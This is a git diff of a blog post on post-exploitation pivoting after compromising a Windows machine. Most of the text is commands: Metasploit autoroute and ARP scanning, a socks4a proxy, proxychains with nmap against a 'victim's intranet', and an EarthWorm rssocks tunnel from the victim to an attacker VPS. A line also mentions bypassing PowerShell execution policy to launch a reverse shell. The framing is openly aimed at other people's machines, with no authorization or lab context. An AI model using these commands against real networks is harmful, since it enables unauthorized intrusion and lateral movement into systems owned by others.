@@ -6,7 +6,7 @@ tags: [PowerShell, Metasploit]
 description: It seems that it's getting more and more popular that everyone would like to scan the whole intranet when he takes down one of the other people's machines. So what to do next after getting the shell of a windows system? Some ideas about that. 
 ---
 
-Here give two methods to trigger a windows reverse shell with PowerShell, remember to bypass the PowerShell security policy before you execute PowerShell command. (https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
+Here gives two methods to trigger a windows reverse shell with PowerShell, remember to bypass the PowerShell security policy before you execute PowerShell command. (https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
 
 For attacker:
 ```shell
@@ -77,24 +77,39 @@ Shutdown your computer and go to sleep unless you have some 0day vulnerabilities
 
 There are some ways to help you to go deep and you can treat your victim as a pivot to find out more vulnerable hosts within the intranet.
 
-Firstly you can use the socks5 module in meterpreter:
+Firstly try to add the routing rules of the target to your meterpreter shell. An msf built-in module "autoroute" and is convenient. (https://www.offensive-security.com/metasploit-unleashed/proxytunnels/)
 
-```shell
-use anxiliary/server/socks5
-set srvhost 127.0.0.1
-set srvport 1080
-run
-```
-Then you can scan the subnet with the help of msf built-in module:
-```shell
-auxiliary/scanner/portscan
-scanner/portscan/syn
-scanner/portscan/tcp
-```
-Another msf built-in module "autoroute" is a good choice as well. (https://www.offensive-security.com/metasploit-unleashed/proxytunnels/)
 ```shell
 meterpreter > run post/multi/manage/autoroute
 ```
+You can enumerate hosts by performing an ARP scan:
+
+```shell
+meterpreter > run post/windows/gather/arp_scanner rhosts=192.168.5.1/24
+```
+
+Adding routing rule is not always working well, you can try the socks4a module in meterpreter:
+
+```shell
+use anxiliary/server/socks4a
+set srvport 1080
+run
+```
+
+If it's Linux in your local machine, you can use proxychains to set the socks5 proxy.
+Getting proxychains installed:
+```shell
+apt install proxychains-ng 
+```
+Add the following content into the /etc/proxychains.conf file:
+```shell
+socks4 127.0.0.1 1080
+```
+Then you can use socks proxy to scan the victim's intranet:
+```shell
+proxychains4 nmap -sT -Pn -open 192.168.5.0/24
+```
+I have tried so many times to find out all the machines in the victim's intranet but I was usually failed. It just works for few times and the process is too slow. Maybe nmap is the reason for this problem, it works well when I use proxychains to get information from other hosts within the same intranet.
 
 Or you can use EarthWorm(http://rootkiter.com/EarthWorm/) to forward the victim machine's port to your VPS and use proxy
 chains or proxifier in your local machine:
@@ -111,20 +126,14 @@ ew.exe -s rssocks -d x.x.x.x -e 1024
 ```
 The argument -d is the IP address of your VPS.
 
-If it's Linux in your local machine, you can use proxychains to set the socks5 proxy.
-Getting proxychains installed:
+Add the following content into the /etc/proxychains.conf file:
 ```shell
-apt install proxychains-ng 
+socks5 x.x.x.x 1080
 ```
-Add the following content in the /etc/proxychains.conf file:
+Use proxychains to scan rest of the hosts:
 ```shell
-socks5 127.0.0.1 1080
+proxychains4 nmap -sT -Pn -open 192.168.5.0/24
 ```
-Then you can use socks proxy to scan the victim's intranet:
-```shell
-proxychains4 nmap -sT -Pn -open 192.168.100.1/22
-```
-I have tried so many times to find out all the machines in the victim's intranet but I was usually failed. It just works for few times and the process is too slow. Maybe nmap is the reason for this problem, it works well when I use proxychains to get information from other hosts within the same intranet.
 
 If you need ports forwarding, it's also available in meterpreter:
 ```shell
